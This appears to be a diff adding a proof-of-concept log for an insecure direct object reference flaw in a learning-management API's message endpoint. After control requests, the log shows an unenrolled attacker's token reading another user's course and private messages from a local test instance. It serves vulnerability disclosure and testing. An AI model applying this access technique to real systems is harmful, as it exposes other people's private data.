@@ -1,0 +1,26 @@
+=== LMS-01: IDOR on GET|POST /api/message (auth:api only; findResource has no ownership check) ===
+[premise] owner id=3 (owns course 1 + its messages), attacker id=4 (never enrolled; course_user table has 0 rows)
+
+[control-0] unauthenticated GET /api/message?type=Course&resource=1:
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:8082/login'" />
+
+        <title>Redirecting to http://127.0.0.1:8082/login</title>
+    </head>
+    <body>
+        Redirecting to <a href="http://127.0.0.1:8082/login">http://127.0.0.1:8082/login</a>.
+    </body>
+</html>
+HTTP 302
+[control-1] OWNER token, GET /api/message?type=Course&resource=1 (legitimate):
+[{"id":1,"user_id":3,"message":"OWNER-SECRET-MSG-1 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z","user":{"id":3,"name":"Owner Teacher","email":"owner@test.local","username":"owner1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/2d37e7c42dd003295b8dcaa15ec126ca.jpg?s=80&d=mp&r=g"}},{"id":2,"user_id":3,"message":"OWNER-SECRET-MSG-2 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z","user":{"id":3,"name":"Owner Teacher","email":"owner@test.local","username":"owner1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/2d37e7c42dd003295b8dcaa15ec126ca.jpg?s=80&d=mp&r=g"}}]
+HTTP 200
+[IDOR-READ] ATTACKER token, GET /api/message?type=Course&resource=1 (not enrolled):
+[{"id":1,"user_id":3,"message":"OWNER-SECRET-MSG-1 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z","user":{"id":3,"name":"Owner Teacher","email":"owner@test.local","username":"owner1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/2d37e7c42dd003295b8dcaa15ec126ca.jpg?s=80&d=mp&r=g"}},{"id":2,"user_id":3,"message":"OWNER-SECRET-MSG-2 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z","user":{"id":3,"name":"Owner Teacher","email":"owner@test.local","username":"owner1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/2d37e7c42dd003295b8dcaa15ec126ca.jpg?s=80&d=mp&r=g"}}]
+HTTP 200
+[IDOR-READ-2] ATTACKER token, GET /api/message?type=User&resource=3 (owner's user-scoped thread):
+[{"id":1,"user_id":3,"message":"OWNER-SECRET-MSG-1 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z"},{"id":2,"user_id":3,"message":"OWNER-SECRET-MSG-2 course thread","messageable_id":1,"messageable_type":"App\\Entities\\Course","created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z"},{"id":3,"user_id":3,"message":"OWNER-USER-SCOPE-MSG","messageable_id":null,"messageable_type":null,"created_at":"2026-09-28T16:53:20.000000Z","updated_at":"2026-09-28T16:53:20.000000Z"}]
+HTTP 200
